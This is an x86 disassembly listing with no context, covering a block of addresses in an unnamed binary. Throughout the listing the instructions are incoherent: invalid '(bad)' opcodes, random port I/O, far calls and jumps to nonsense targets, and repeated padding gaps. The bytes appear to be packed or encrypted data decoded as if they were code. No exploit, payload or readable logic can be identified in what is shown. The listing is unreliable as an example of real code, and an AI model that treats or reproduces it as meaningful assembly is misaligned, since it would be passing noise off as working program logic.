  41ecf0:	lds    ebp,FWORD PTR [ecx-0x78]
  41ecf3:	mov    bh,0x53
  41ecf5:	scas   eax,DWORD PTR es:[edi]
  41ecf6:	cdq    
  41ecf7:	mov    ebx,0x5d470b3e
  41ecfc:	xor    BYTE PTR gs:[ebx],dh
  41ecff:	cmp    eax,DWORD PTR [eax]
	...
  41ed09:	add    BYTE PTR [eax],al
  41ed0b:	xor    dl,bl
  41ed0d:	into   
  41ed0e:	mov    ds:0xd37ebfef,al
  41ed13:	sub    edi,DWORD PTR [esi]
  41ed15:	out    0x3f,eax
  41ed17:	adc    DWORD PTR [ecx-0x702d5e22],esp
  41ed1d:	add    DWORD PTR [eax],eax
  41ed1f:	lods   eax,DWORD PTR ds:[esi]
  41ed20:	add    BYTE PTR [eax],al
  41ed22:	add    dl,bh
  41ed24:	xchg   esp,eax
  41ed25:	into   
  41ed26:	pop    ebp
  41ed27:	fadd   DWORD PTR [ebp+esi*2-0x3d779866]
  41ed2e:	clc    
  41ed2f:	sbb    al,0x43
  41ed31:	inc    esi
  41ed32:	stos   BYTE PTR es:[edi],al
  41ed33:	icebp  
  41ed34:	das    
  41ed35:	and    ecx,ebp
  41ed37:	stos   DWORD PTR es:[edi],eax
  41ed38:	out    0x14,eax
  41ed3a:	rcl    ah,0x88
  41ed3d:	(bad)
  41ed40:	loop   0x41eda5
  41ed42:	loopne 0x41ed29
  41ed44:	add    al,al
  41ed46:	jl     0x41ecd3
  41ed48:	aas    
  41ed49:	lahf   
  41ed4a:	cmc    
  41ed4b:	sbb    BYTE PTR [ebx-0x6ef3cffe],bh
  41ed51:	test   DWORD PTR [edi],eax
  41ed53:	and    ebp,ecx
  41ed55:	xchg   edi,eax
  41ed56:	add    DWORD PTR [ebp-0x60],ebx
  41ed59:	mov    dl,0xb4
  41ed5b:	sbb    BYTE PTR [ebx+0x151282d4],al
  41ed61:	dec    esi
  41ed62:	pop    esp
  41ed63:	mov    BYTE PTR [ebp+0x2a],bl
  41ed66:	jmp    0x41ed17
  41ed68:	into   
  41ed69:	mov    esp,0xdf655aa0
  41ed6e:	or     esi,DWORD PTR [ebx+ebx*8+0x32]
  41ed72:	jmp    0x41ed77
  41ed74:	mov    edx,0xc4208806
  41ed79:	js     0x41edc1
  41ed7b:	ja     0x41ed03
  41ed7d:	ret    0xa0f5
  41ed80:	or     bh,BYTE PTR [ebx]
  41ed82:	mov    dh,0xb2
  41ed84:	xchg   BYTE PTR [eax+0x40],ah
  41ed87:	mov    es,ebp
  41ed89:	mov    ebx,0xc0172e34
  41ed8e:	cmp    BYTE PTR [ecx-0x19],bh
  41ed91:	ja     0x41ed2a
  41ed93:	jns    0x41ed7f
  41ed95:	and    al,0xc9
  41ed97:	jo     0x41ed9e
  41ed99:	loopne 0x41ee18
  41ed9b:	xlat   BYTE PTR ds:[ebx]
  41ed9c:	inc    edx
  41ed9d:	mov    ecx,DWORD PTR [ecx+ecx*2]
  41eda0:	or     BYTE PTR [esi-0x157ca44f],dl
  41eda6:	mov    DWORD PTR [esi+edx*8],ecx
  41eda9:	mov    WORD PTR [esi+0x5e64f11e],gs
  41edaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edb0:	imul   edi,DWORD PTR ds:0x5dfa5a71,0x24
  41edb7:	push   esi
  41edb8:	sqrtps xmm2,XMMWORD PTR [edx+edi*2]
  41edbc:	xchg   edi,eax
  41edbd:	outs   dx,BYTE PTR ds:[esi]
  41edbe:	dec    esi
  41edbf:	fisttp QWORD PTR [esi+0x33]
  41edc2:	xor    DWORD PTR [edi-0x22],edx
  41edc5:	call   0xfa31:0x6f320a5f
  41edcc:	mov    ds:0x798c6,al
	...
  41edd9:	add    BYTE PTR [eax],al
  41eddb:	fucomi st,st(5)
  41eddd:	outs   dx,BYTE PTR ds:[esi]
  41edde:	and    bh,BYTE PTR [esi-0x5d]
  41ede1:	(bad)  
  41ede3:	pop    esi
  41ede4:	(bad)  
  41ede5:	mov    DWORD PTR [ebp-0x6d3f1f75],ecx
  41edeb:	jg     0x41ed7d
  41eded:	add    DWORD PTR [eax],eax
  41edef:	lods   eax,DWORD PTR ds:[esi]
  41edf0:	add    BYTE PTR [eax],al
  41edf2:	add    BYTE PTR [ebx-0x23],ah
  41edf5:	adc    BYTE PTR [eax-0x283b97fc],0xf3
  41edfc:	jo     0x41ee66
  41edfe:	sbb    eax,0x603a4dc9
  41ee03:	jb     0x41ee33
  41ee05:	inc    ebp
  41ee06:	add    al,0x75
  41ee08:	xchg   esp,eax
  41ee09:	add    DWORD PTR [edx+0x27],eax
  41ee0c:	adc    DWORD PTR [ebp-0x8],esp
  41ee0f:	aaa    
  41ee10:	jns    0x41edb8
  41ee12:	out    dx,al
  41ee13:	add    BYTE PTR [ecx-0x6],al
  41ee16:	ss adc eax,0xfdbe7d8
  41ee1c:	xchg   edi,eax
  41ee1d:	sbb    ecx,DWORD PTR [edx+edi*1]
  41ee20:	cld    
  41ee21:	bound  ecx,QWORD PTR [ecx-0x7e]
  41ee24:	mov    dl,0x8
  41ee26:	pop    ebp
  41ee27:	aam    0x19
  41ee29:	inc    eax
  41ee2a:	add    DWORD PTR [edx+0x7b7c3dbd],ebx
  41ee30:	mov    BYTE PTR [eax],bl
  41ee32:	xchg   edi,eax
  41ee33:	popa   
  41ee34:	lea    esp,[edx+0x30133376]
  41ee3a:	pop    ecx
  41ee3b:	or     DWORD PTR [esi],esi
  41ee3d:	xor    bl,BYTE PTR [ecx+ebx*4]
  41ee40:	aas    
  41ee41:	stos   DWORD PTR es:[edi],eax
  41ee42:	xchg   BYTE PTR [ebx+0x2d],dh
  41ee45:	jle    0x41edd8
  41ee47:	add    cl,ah
  41ee49:	shl    DWORD PTR [edx],1
  41ee4b:	sbb    eax,0xb760421e
  41ee50:	push   0xe598c306
  41ee55:	(bad)  
  41ee56:	mov    ecx,0xc5fdb61a
  41ee5b:	sbb    al,0x21
  41ee5d:	mov    edx,0x88ddea27
  41ee62:	int3   
  41ee63:	in     al,0x7f
  41ee65:	jg     0x41eec6
  41ee67:	imul   eax,DWORD PTR [edx+ebx*8+0x6b],0xfffffff2
  41ee6c:	outs   dx,DWORD PTR ds:[esi]
  41ee6d:	lods   eax,DWORD PTR ds:[esi]
  41ee6e:	pushf  
  41ee6f:	lods   al,BYTE PTR ds:[esi]
  41ee70:	js     0x41ee54
  41ee72:	xchg   esp,eax
  41ee73:	out    0xd2,al
  41ee75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee76:	push   ecx
  41ee77:	inc    ebp
  41ee78:	ja     0x41ee24
  41ee7a:	repz mov ebp,0x83e90126
  41ee80:	adc    DWORD PTR [edx-0x18],edx
  41ee83:	adc    DWORD PTR [ebp+0x74ec85fe],0x37
  41ee8a:	adc    al,0xe4
  41ee8c:	and    ebp,DWORD PTR [eax-0x393b465e]
  41ee92:	push   0x5a
  41ee94:	(bad)  
  41ee95:	jecxz  0x41ee98
  41ee97:	and    eax,0x972330ca
  41ee9c:	(bad)  
  41ee9d:	push   cs
  41ee9e:	std    
  41ee9f:	pop    ecx
	...
  41eea8:	add    BYTE PTR [eax],al
  41eeaa:	add    BYTE PTR ds:0x6f976b22,al
  41eeb0:	(bad)  
  41eeb2:	mov    dl,0x66
  41eeb4:	and    BYTE PTR [esi-0x6ba7cd96],ah
  41eeba:	or     eax,0x1912c
  41eebf:	lods   eax,DWORD PTR ds:[esi]
  41eec0:	add    BYTE PTR [eax],al
  41eec2:	add    BYTE PTR [ecx],al
  41eec4:	jo     0x41ee7d
  41eec6:	inc    esi
  41eec7:	adc    al,0xca
  41eec9:	jbe    0x41ef3e
  41eecb:	dec    edi
  41eecc:	fimul  DWORD PTR [eax-0x616fc5e5]
  41eed2:	outs   dx,DWORD PTR ds:[esi]
  41eed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed4:	call   0x63200a86
  41eed9:	int    0x4b
  41eedb:	cmp    eax,0x2e7c9ce3
  41eee0:	fnstenv [ecx+0x6e9268eb]
  41eee6:	xchg   BYTE PTR [ecx+0xc39b246],al
  41eeec:	pusha  
  41eeed:	cld    
  41eeee:	sub    bl,al
  41eef0:	outs   dx,BYTE PTR ds:[esi]
  41eef1:	std    
  41eef2:	and    al,0xd4
  41eef4:	shl    BYTE PTR [ecx],1
  41eef6:	stos   DWORD PTR es:[edi],eax
  41eef7:	dec    esi
  41eef8:	dec    edx
  41eef9:	xchg   BYTE PTR [edx],ch
  41eefb:	ins    DWORD PTR es:[edi],dx
  41eefc:	xor    ecx,DWORD PTR [edi-0x1e]
  41eeff:	adc    al,0x71
  41ef01:	push   ebx
  41ef02:	je     0x41ef06
  41ef04:	inc    esi
  41ef05:	in     eax,dx
  41ef06:	sub    dl,BYTE PTR [ebx+0x6e]
  41ef09:	xchg   edx,eax
  41ef0a:	or     DWORD PTR [ebx+0x74ca5fb8],ebp
  41ef10:	lahf   
  41ef11:	inc    ecx
  41ef12:	rcr    DWORD PTR [ecx-0x27de029d],0x7
  41ef19:	adc    al,0x2a
  41ef1b:	mov    ebp,0x6903c08d
  41ef20:	mov    DWORD PTR [ebx],esp
  41ef22:	ret    0x3097
  41ef25:	rol    DWORD PTR [ecx],1
  41ef27:	add    esi,DWORD PTR [edi-0x485ea88a]
  41ef2d:	inc    esi
  41ef2e:	not    DWORD PTR [si]
  41ef31:	pop    ds
  41ef32:	ss mov ebp,edi
  41ef35:	pop    esi
  41ef36:	in     eax,dx
  41ef37:	mov    ah,0x29
  41ef39:	loop   0x41ef68
  41ef3b:	js     0x41eeca
  41ef3d:	adc    dl,BYTE PTR [ebp+0x2f3e4482]
  41ef43:	xchg   ebx,eax
  41ef44:	in     al,dx
  41ef45:	inc    esp
  41ef46:	xchg   edi,eax
  41ef47:	jne    0x41eed3
  41ef49:	outs   dx,DWORD PTR ds:[esi]
  41ef4a:	add    esp,ecx
  41ef4c:	mov    WORD PTR [esi-0x18],?
  41ef4f:	(bad)  
  41ef50:	ins    DWORD PTR es:[edi],dx
  41ef51:	loope  0x41ef91
  41ef53:	into   
  41ef54:	dec    ecx
  41ef55:	pop    eax
  41ef56:	fs and eax,0x8ae4db08
  41ef5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef5d:	cmp    BYTE PTR [ebx+0x47e322c9],0x85
  41ef64:	ja     0x41ef0d
  41ef66:	out    dx,al
  41ef67:	push   ecx
  41ef68:	ins    BYTE PTR es:[edi],dx
  41ef69:	pop    esi
  41ef6a:	pop    edi
  41ef6b:	push   ebp
  41ef6d:	mov    ds:0xc2c8,al
	...
  41ef7a:	add    BYTE PTR [ebx+0x7fd924d4],cl
  41ef80:	stc    
  41ef81:	call   esi
  41ef83:	into   
  41ef84:	inc    ebp
  41ef85:	mov    bh,0x11
  41ef87:	js     0x41efc6
  41ef89:	inc    esp
  41ef8a:	mov    bh,0xd9
  41ef8c:	xchg   ecx,eax
  41ef8d:	add    DWORD PTR [eax],eax
  41ef8f:	lods   eax,DWORD PTR ds:[esi]
  41ef90:	add    BYTE PTR [eax],al
  41ef92:	add    BYTE PTR [ebx+0x6f],dl
  41ef95:	mov    ?,WORD PTR [esi+0x68]
  41ef98:	add    BYTE PTR [esp+edi*2+0x3885b754],0xf
  41efa0:	add    al,0xbf
  41efa2:	or     bl,ah
  41efa4:	inc    esp
  41efa5:	mov    esp,DWORD PTR [ebx-0x54c5be66]
  41efab:	imul   edx,DWORD PTR [edi+eiz*2+0x19610e9b],0x22ad2403
  41efb6:	lods   al,BYTE PTR ds:[esi]
  41efb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efb8:	(bad)  
  41efb9:	sub    ch,BYTE PTR [eax+edi*2+0x6]
  41efbd:	pushf  
  41efbe:	dec    esp
  41efbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efc0:	(bad)
  41efc4:	or     BYTE PTR [ebx+0x2d794b58],0x5e
  41efcb:	mov    ecx,0x178dacde
  41efd0:	mov    al,bh
  41efd2:	lds    ebx,FWORD PTR [edx-0x6d]
  41efd5:	cmp    bh,BYTE PTR [eax]
  41efd7:	jns    0x41ef99
  41efd9:	sti    
  41efda:	dec    ebx
  41efdb:	add    esp,edi
  41efdd:	sbb    DWORD PTR [edx+0x71],esp
  41efe0:	mov    edx,0xb07d6ea8
  41efe5:	mov    eax,0x4b3ca9fd
  41efea:	leave  
  41efeb:	and    al,0x44
  41efed:	pop    esi
  41efee:	int    0x1b
  41eff0:	xor    eax,0xdff70049
  41eff5:	jnp    0x41f028
  41eff7:	lods   al,BYTE PTR ds:[esi]
  41eff8:	xor    ebx,edx
  41effa:	cs jbe 0x41f054
  41effd:	cmp    al,0xef
  41efff:	or     DWORD PTR [edi-0x3b],esp
  41f002:	mov    esp,0x393b312e
  41f007:	xchg   ebx,eax
  41f008:	mov    bh,0x17
  41f00a:	xor    BYTE PTR [edx],dl
  41f00c:	retf   
  41f00d:	sbb    BYTE PTR [ebx],bl
  41f00f:	inc    ebp
  41f010:	push   esp
  41f011:	out    dx,eax
  41f012:	nop
  41f013:	xor    bl,BYTE PTR [esi]
  41f015:	inc    edx
  41f016:	push   edx
  41f017:	hlt    
  41f018:	sbb    BYTE PTR [esi+0x1b80ac0a],bh
  41f01e:	or     ah,ah
  41f020:	fmul   DWORD PTR [esi]
  41f022:	push   ecx
  41f023:	mov    bh,0xbd
  41f025:	sti    
  41f026:	ja     0x41f081
  41f028:	mov    esi,0xd3d3bc6f
  41f02d:	sub    eax,0xbbaddc66
  41f032:	gs in  eax,0x90
  41f035:	jg     0x41eff9
  41f037:	stos   BYTE PTR es:[edi],al
  41f038:	call   0xeef5c18e
  41f03d:	popf   
  41f03e:	(bad)  [eax+eax*1+0x0]
  41f045:	add    BYTE PTR [eax],al
  41f047:	add    BYTE PTR [eax],al
  41f049:	add    BYTE PTR [eax],al
  41f04b:	fisubr WORD PTR [ecx]
  41f04d:	cwde   
  41f04e:	sar    bh,cl
  41f050:	repz fisubr WORD PTR ds:0x4af35f6
  41f057:	nop
  41f058:	push   esi
  41f059:	dec    edx
  41f05a:	inc    edx
  41f05b:	xchg   BYTE PTR [edx+0xad0001],dl
  41f061:	add    BYTE PTR [eax],al
  41f063:	push   ebx
  41f064:	(bad)  
  41f065:	adc    DWORD PTR [edi+0x4b],ecx
  41f068:	cmp    DWORD PTR [edx+0x7071dc6d],esi
  41f06e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f06f:	inc    esi
  41f070:	imul   esi,DWORD PTR [esi-0x3],0x16
  41f074:	add    al,BYTE PTR [eax+0x51d6a5ea]
  41f07a:	cmp    ebp,DWORD PTR [ecx+0x6e]
  41f07d:	test   DWORD PTR [esi],esi
  41f07f:	mov    es,WORD PTR gs:0x65b44d4a
  41f086:	add    eax,0x129a01e
  41f08b:	imul   esi,ecx,0xae6836ac
  41f091:	jp     0x41f0e5
  41f093:	out    0xff,al
  41f095:	inc    edx
  41f096:	jmp    0x3157:0x2d886d89
  41f09d:	jmp    0x4878:0xac5ca5cc
  41f0a4:	leave  
  41f0a5:	push   ebx
  41f0a6:	inc    ecx
  41f0a7:	jmp    0xbd6d:0x67b6f096
  41f0ae:	xor    dl,BYTE PTR cs:[ecx]
  41f0b1:	mov    ecx,0x285dcd85
  41f0b6:	cmp    edi,DWORD PTR [ebx+0x65]
  41f0b9:	stc    
  41f0ba:	test   DWORD PTR [ebp+ecx*2+0x28],edx
  41f0be:	add    al,BYTE PTR [ecx+0x4]
  41f0c1:	out    0xaa,eax
  41f0c3:	dec    eax
  41f0c4:	and    BYTE PTR ds:0x5b7b5f64,bh
  41f0ca:	stc    
  41f0cb:	jbe    0x41f13e
  41f0cd:	div    DWORD PTR [edi-0x5d]
  41f0d0:	cld    
  41f0d1:	xchg   ebx,eax
  41f0d2:	sbb    eax,0xbe68f5bb
  41f0d7:	mov    ds:0x327ab4d8,eax
  41f0dc:	ins    DWORD PTR es:[edi],dx
  41f0dd:	xchg   edi,eax
  41f0de:	cmp    DWORD PTR [edx],0x79
  41f0e1:	jno    0x41f145
  41f0e3:	and    dh,BYTE PTR [ebp+0x2dff5259]
  41f0e9:	sub    eax,0xaf78c13b
  41f0ee:	sub    BYTE PTR [ecx+ebp*1-0x611ea7f4],dh
  41f0f5:	mov    eax,0xfd6a2c26
  41f0fa:	mov    edi,0x400dd8ce
  41f0ff:	jl     0x41f0a1
  41f101:	cmp    edx,edi
  41f103:	push   0xa304345c
  41f108:	enter  0x2545,0xdc
  41f10c:	sbb    al,BYTE PTR [esi+0x38d4]
	...
  41f11a:	add    BYTE PTR [esi+0x3f],cl
  41f11d:	int3   
  41f11e:	sbb    eax,0x7fdffffd
  41f123:	out    dx,eax
  41f124:	loopne 0x41f13c
  41f126:	lods   al,BYTE PTR ds:[esi]
  41f127:	jmp    0x193:0x33d403a2
  41f12e:	add    BYTE PTR [ebp+0x2b000000],ch
  41f134:	and    ch,BYTE PTR ds:0x33327c5d
  41f13a:	jae    0x41f0c4
  41f13c:	jmp    0x41f0e7
  41f13e:	xor    eax,DWORD PTR [ecx-0x62f1e2ad]
  41f144:	xchg   esp,eax
  41f145:	cmp    eax,0xef803f3c
  41f14a:	pop    ecx
  41f14b:	std    
  41f14c:	cdq    
  41f14d:	and    esp,ebp
  41f14f:	mov    al,0x56
  41f151:	fist   DWORD PTR [esi+0x66]
  41f154:	cwde   
  41f155:	push   es
  41f156:	xor    eax,0x10313540
  41f15b:	mov    DWORD PTR [ebx+0x71],eax
  41f15e:	mov    esi,0x4989ceeb
  41f163:	mov    edi,0xabd1c39a
  41f168:	sub    esi,DWORD PTR [eax+0x432a4ebf]
  41f16e:	aam    0x85
  41f170:	cmp    BYTE PTR ds:0x130c60a2,dh
  41f176:	add    edi,DWORD PTR ds:0x5b4ae3dc
  41f17c:	test   eax,0x90a674fd
  41f181:	xor    ebx,ecx
  41f183:	xchg   ecx,eax
  41f184:	and    DWORD PTR [eax-0x4b],ebp
  41f187:	or     DWORD PTR [edx+edx*8-0x3c],esi
  41f18b:	add    BYTE PTR [esi-0x14],0xd4
  41f18f:	int    0x15
  41f191:	fdiv   st,st(5)
  41f193:	fs shr ebx,cl
  41f196:	mov    dl,ch
  41f198:	dec    ebp
  41f199:	std    
  41f19a:	mov    esi,0x8aff203a
  41f19f:	rol    al,0x8d
  41f1a2:	jmp    0xa445b238
  41f1a7:	xchg   edi,eax
  41f1a8:	dec    edx
  41f1a9:	mov    dl,0x86
  41f1ab:	test   al,0xfb
  41f1ad:	sbb    cl,dl
  41f1af:	fs and ecx,ebx
  41f1b2:	pop    ecx
  41f1b3:	ret    
  41f1b4:	pushf  
  41f1b5:	push   ds
  41f1b6:	adc    al,0x36
  41f1b8:	push   ebp
  41f1b9:	sub    BYTE PTR [ebx+0x73bdaec8],ah
  41f1bf:	xchg   esi,eax
  41f1c0:	les    ebp,FWORD PTR [ebp+0x3ec39bec]
  41f1c6:	imul   eax,DWORD PTR [edx-0x581636aa],0x28
  41f1cd:	call   0xe1bc:0x9e3a6c21
  41f1d4:	push   ds
  41f1d5:	in     eax,0x42
  41f1d7:	stc    
  41f1d8:	loope  0x41f246
  41f1da:	or     BYTE PTR [ecx],cl
  41f1dc:	push   esp
  41f1dd:	fwait
  41f1de:	inc    esi
  41f1df:	fwait
	...
  41f1e8:	add    BYTE PTR [eax],al
  41f1ea:	add    BYTE PTR [esi],bl
  41f1ec:	test   eax,0x7ff735f6
  41f1f1:	fild   QWORD PTR [ebx-0x5f9ed871]
  41f1f7:	sub    DWORD PTR [edi-0x16],ebp
  41f1fa:	pop    edx
  41f1fb:	loopne 0x41f190
  41f1fd:	add    DWORD PTR [eax],eax
  41f1ff:	lods   eax,DWORD PTR ds:[esi]
  41f200:	add    BYTE PTR [eax],al
  41f202:	add    BYTE PTR [edx+0x4967e92],bh
  41f208:	mov    edx,0xfaa43b11
  41f20d:	leave  
  41f20e:	and    eax,0xeda31de7
  41f213:	test   cl,dl
  41f215:	adc    al,0x5e
  41f217:	std    
  41f218:	enter  0x3ae9,0xfc
  41f21c:	push   ebp
  41f21d:	sbb    BYTE PTR [ebp+0x4209a3fc],dl
  41f223:	in     eax,dx
  41f224:	jmp    0x4739:0x7107fabc
  41f22b:	arpl   di,bx
  41f22d:	inc    ebx
  41f22e:	pushf  
  41f22f:	es ja  0x41f1d6
  41f232:	or     ebp,esi
  41f234:	lea    ebx,[eax-0x7e]
  41f237:	mov    eax,esp
  41f239:	in     eax,0xc9
  41f23b:	inc    ebp
  41f23c:	cmp    DWORD PTR [eax+0x2ab9e65c],0xffffffa8
  41f243:	dec    ebx
  41f244:	cmp    BYTE PTR ds:0xfd69a11c,al
  41f24a:	jmp    DWORD PTR [ebp-0x182034ec]
  41f250:	push   0xffffffec
  41f252:	loope  0x41f215
  41f254:	rcl    DWORD PTR [ebx+0x154d766],cl
  41f25a:	fist   DWORD PTR [edi+0x1c]
  41f25d:	cdq    
  41f25e:	popf   
  41f25f:	int    0x2
  41f261:	mov    ah,0x50
  41f263:	outs   dx,DWORD PTR ds:[esi]
  41f264:	js     0x41f212
  41f266:	jo     0x41f202
  41f268:	push   eax
  41f269:	or     BYTE PTR [ebx+0x412c4176],ah
  41f26f:	nop
  41f270:	in     eax,dx
  41f271:	add    al,0x62
  41f273:	sub    BYTE PTR [ebx-0x1],bl
  41f276:	or     ecx,esi
  41f278:	or     eax,0xb4d2f928
  41f27d:	xchg   ebx,eax
  41f27e:	xchg   esp,eax
  41f27f:	shl    dl,cl
  41f281:	leave  
  41f282:	popf   
  41f283:	mov    eax,DWORD PTR [edi]
  41f285:	retf   0xc44
  41f288:	(bad)  
  41f289:	les    ecx,FWORD PTR [ebx]
  41f28b:	icebp  
  41f28c:	cmp    eax,0xfab7e4a8
  41f291:	out    dx,eax
  41f292:	inc    edi
  41f293:	jbe    0x41f253
  41f295:	mov    bl,0xa4
  41f297:	ror    BYTE PTR [eax-0x6067d018],0x1
  41f29e:	fisttp QWORD PTR [edx+0x2e9c4204]
  41f2a4:	outs   dx,BYTE PTR ds:[esi]
  41f2a5:	retf   
  41f2a6:	and    al,0x9e
  41f2a8:	inc    ebp
  41f2a9:	aaa    
  41f2aa:	jp     0x41f2c8
  41f2ac:	aas    
  41f2ad:	or     DWORD PTR [eax+ebp*1],0x0
	...
  41f2b9:	add    BYTE PTR [eax],al
  41f2bb:	fwait
  41f2bc:	loope  0x41f32b
  41f2be:	sub    eax,0xf7dbad7f
  41f2c3:	sar    BYTE PTR [ebx],cl
  41f2c5:	(bad)  
  41f2c6:	add    BYTE PTR [eax],dh
  41f2c8:	sbb    esi,ecx
  41f2ca:	fisttp WORD PTR [ebp-0x52fffe6c]
  41f2d0:	add    BYTE PTR [eax],al
  41f2d2:	add    BYTE PTR [esi+0xdd0278a],dh
  41f2d8:	in     al,dx
  41f2d9:	adc    al,0xf7
  41f2db:	mov    WORD PTR es:[ecx],cs
  41f2de:	adc    al,0xf1
  41f2e0:	std    
  41f2e1:	es popa 
  41f2e3:	mov    ch,0xc9
  41f2e5:	xchg   edx,eax
  41f2e6:	mov    esp,0xde2f31c0
  41f2eb:	mov    eax,DWORD PTR [esi-0x42]
  41f2ee:	mov    ebx,0xf23138b4
  41f2f3:	scas   al,BYTE PTR es:[edi]
  41f2f4:	loopne 0x41f2eb
  41f2f6:	test   eax,0x131b5d46
  41f2fb:	push   ds
  41f2fc:	xchg   esp,eax
  41f2fd:	adc    DWORD PTR [eax+0x60367687],ecx
  41f303:	or     eax,0xdd8eaae5
  41f308:	test   eax,0xbc862b2c
  41f30d:	aaa    
  41f30e:	mov    cl,0x9b
  41f310:	sbb    ebx,DWORD PTR [esi+0x33298a3b]
  41f316:	mov    esi,DWORD PTR [ebx]
  41f318:	or     ebp,DWORD PTR [ebp-0x71ae34dc]
  41f31e:	scas   eax,DWORD PTR es:[edi]
  41f31f:	sar    eax,cl
  41f321:	jae    0x41f384
  41f323:	lock imul esp,DWORD PTR [esi],0x21
  41f327:	cld    
  41f328:	xor    ebx,DWORD PTR [ebx-0x77]
  41f32b:	pop    ebx
  41f32c:	lahf   
  41f32d:	cld    
  41f32e:	imul   edx,DWORD PTR [ebp-0x3a],0x58
  41f332:	out    0x41,al
  41f334:	or     al,0x2c
  41f336:	and    BYTE PTR [ecx],ch
  41f338:	mov    DWORD PTR [edx],edi
  41f33a:	data16 int3 
  41f33c:	test   DWORD PTR [ecx+0x45ec82c2],edx
  41f342:	dec    ecx
  41f343:	mov    al,0x5b
  41f345:	aas    
  41f346:	or     eax,0xafdb6fab
  41f34b:	push   ebp
  41f34c:	cmp    BYTE PTR [ebp+edx*2+0x28fa6949],cl
  41f353:	sbb    al,0x87
  41f355:	add    esp,esp
  41f357:	and    DWORD PTR [ebx+eiz*1-0x3b2bfbc3],esp
  41f35e:	fwait
  41f35f:	sar    DWORD PTR [edx],cl
  41f361:	fs mov eax,0x2d13d06
  41f367:	xor    BYTE PTR [esi],0x98
  41f36a:	(bad)  
  41f36b:	fucomp st(3)
  41f36d:	push   ecx
  41f36e:	mov    ecx,0x9f2d9479
  41f373:	call   0x1216:0xa42d721f
  41f37a:	push   edi
  41f37b:	jno    0x41f305
  41f37d:	jae    0x41f31b
  41f37f:	les    eax,FWORD PTR [eax]
	...
  41f389:	add    BYTE PTR [eax],al
  41f38b:	or     bh,dh
  41f38d:	ja     0x41f3d9
  41f38f:	dec    edx
  41f391:	cmp    eax,0x2e8eedf7
  41f396:	dec    eax
  41f397:	imul   esp,DWORD PTR [esi-0x6ac53dfe],0x1
  41f39e:	add    BYTE PTR [ebp-0x60000000],ch
  41f3a4:	int    0x36
  41f3a6:	ins    BYTE PTR es:[edi],dx
  41f3a7:	repz (bad) 
  41f3a9:	in     al,dx
  41f3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3ab:	push   ss
  41f3ac:	pop    ss
  41f3ad:	ret    
  41f3ae:	or     al,0x60
  41f3b0:	dec    esi
  41f3b1:	dec    ebx
  41f3b2:	lea    ebx,[eax]
  41f3b4:	enter  0xf923,0x3a
  41f3b8:	mov    al,0x6e
  41f3ba:	ror    DWORD PTR [ecx],0x81
  41f3bd:	jg     0x41f389
  41f3bf:	lods   eax,DWORD PTR ds:[esi]
  41f3c0:	shl    BYTE PTR [edi+0x3f],0x92
  41f3c4:	test   eax,0x23d3b584
  41f3c9:	xor    eax,0xfa3c1bc7
  41f3ce:	push   esi
  41f3cf:	cmp    BYTE PTR [ebp+0x2b],bl
  41f3d2:	popf   
  41f3d3:	fstp   QWORD PTR [ecx+0x4a]
  41f3d6:	fdivr  DWORD PTR [edi]
  41f3d8:	std    
  41f3d9:	into   
  41f3da:	mov    ebp,eax
  41f3dc:	cmc    
  41f3dd:	les    eax,FWORD PTR [edx]
  41f3df:	sbb    al,0x1e
  41f3e1:	sub    BYTE PTR [edi+0x2b],dh
  41f3e4:	push   eax
  41f3e5:	test   eax,0x308c667d
  41f3ea:	mov    al,0xaf
  41f3ec:	out    0x6d,eax
  41f3ee:	mov    dh,0x24
  41f3f0:	mov    al,ds:0x19d4878f
  41f3f5:	xchg   esi,eax
  41f3f6:	push   ds
  41f3f7:	xchg   edi,eax
  41f3f8:	popa   
  41f3f9:	rol    BYTE PTR [edi+0x1b81237b],1
  41f3ff:	xchg   ebx,eax
  41f400:	pop    ebp
  41f401:	jge    0x41f434
  41f403:	rcl    DWORD PTR [ebx+0x5c2eea86],0x45
  41f40a:	inc    eax
  41f40b:	imul   edx,DWORD PTR [ecx+0x19],0xffffff9c
  41f40f:	xchg   edi,eax
  41f410:	mov    edi,0x40d3df4
  41f415:	out    0xf5,eax
  41f417:	shl    BYTE PTR [edx+0x15e7da5e],cl
  41f41d:	push   0xc4478e05
  41f422:	push   ebp
  41f423:	pushf  
  41f424:	lock mov esi,0x333477df
  41f42a:	aad    0x8
  41f42c:	push   esi
  41f42d:	mov    ebp,0x5f271b46
  41f432:	sbb    cl,BYTE PTR [eax]
  41f434:	popf   
  41f435:	mov    dl,0xd4
  41f437:	retf   
  41f438:	sub    DWORD PTR [edi],eax
  41f43a:	je     0x41f3d4
  41f43c:	sbb    al,0xa4
  41f43e:	cmp    al,0xe
  41f440:	lds    edi,FWORD PTR [esi]
  41f442:	call   0xa61b:0xd3bbc19e
  41f449:	dec    esp
  41f44a:	cwde   
  41f44b:	adc    eax,0x28cdae09
	...
  41f458:	add    BYTE PTR [eax],al
  41f45a:	add    BYTE PTR [esi],dh
  41f45c:	arpl   WORD PTR [eax-0x10],bp
  41f45f:	jge    0x41f45c
  41f461:	mov    esi,0x8c7853e7
  41f466:	daa    
  41f467:	push   edi
  41f468:	mov    ds:0x95e7bdad,al
  41f46d:	add    DWORD PTR [eax],eax
  41f46f:	lods   eax,DWORD PTR ds:[esi]
  41f470:	add    BYTE PTR [eax],al
  41f472:	add    dh,bh
  41f474:	lahf   
  41f475:	add    al,0xc5
  41f477:	mov    dh,0xb2
  41f479:	push   ss
  41f47a:	out    dx,al
  41f47b:	in     eax,dx
  41f47c:	or     al,0x31
  41f47e:	xor    eax,0x114e9658
  41f483:	mov    ebx,0x13420bfe
  41f488:	add    edx,esp
  41f48a:	cld    
  41f48b:	lods   al,BYTE PTR ds:[esi]
  41f48c:	sub    ah,0x33
  41f48f:	bound  eax,QWORD PTR [ebp-0x5f]
  41f492:	inc    esi
  41f493:	pop    esp
  41f494:	rcr    DWORD PTR [edi+ebp*4-0x14d81ddb],cl
  41f49b:	or     ebx,DWORD PTR [eax+0x55a69de]
  41f4a1:	fisubr DWORD PTR [edi-0x44788ddc]
  41f4a7:	mov    cl,0x82
  41f4a9:	inc    ebx
  41f4aa:	cmp    al,0xd7
